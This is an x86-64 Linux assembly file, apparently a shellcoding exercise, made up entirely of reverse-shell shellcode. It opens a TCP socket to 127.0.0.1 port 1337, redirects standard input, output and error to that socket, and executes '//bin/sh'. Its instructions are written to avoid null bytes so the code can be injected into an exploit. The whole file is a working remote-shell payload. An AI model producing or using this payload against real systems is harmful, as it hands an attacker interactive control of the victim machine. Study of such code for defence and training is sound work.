BITS 64

SECTION .text
global _start

_start:

	;clean refisters

	xor rax,rax
	xor rdi,rdi
	xor rsi,rsi
	xor rdx,rdx
	xor r12,r12


	mov al,41				;sys_socket syscall
	mov dil,2				;AF_INET
	mov sil,1				;SOCK_STRAM
	;tcp protocol in rdx alrdy at 0

	syscall

	mov rdi,rax 				;fd returned by sys_socket


	; Prepare structure  sock_adress
	push r12
	mov r12,0xffffffff
	sub r12,0xfffffffffeffff80
	push r12				; push 127.0.0.1 in little endian
	push WORD 0x3905			;port : 1337
	push WORD 0x2				;AF_INET

	mov rsi,rsp 				;sock_adress
	mov dl,16				;sock_adress_len

	mov al,42				;sys_cponnect syscall
	syscall

	;duplicate file descriptor
	;rdi is already set to socket fd

	xor rsi,rsi				;clean rsi

	mov al,33				;dup2 syscall
	syscall 				;rsi alrdy set to 0

	mov al,33				;dup2 syscall
	mov sil,1
	syscall

	mov al,33				;dup2 syscall
	mov sil,2
	syscall


	;invoke shell

        xor r12,r12
        xor rax,rax
        push r12
        mov r12,0x68732F6E69622F2F		;put "//bin/sh" in r12
        push r12				;push it to the stack
        mov rdi,rsp				;set rdi to adress "//bin/sh" in the stack
        xor r12,r12				;set r12 to null
        push r12				;push a null POINTER for the structure end
        push rdi				;push the adress of "//bin/sh" on the stack
        mov rsi,rsp				;put the structure start adress in rsi
        xor rdx,rdx				;set rdx to null bc no env variables
        mov al,59				;set rax to 59 for execve
        syscall					;syscall to execve



	mov al,60				;exit 0
        mov rdi,r12
        syscall
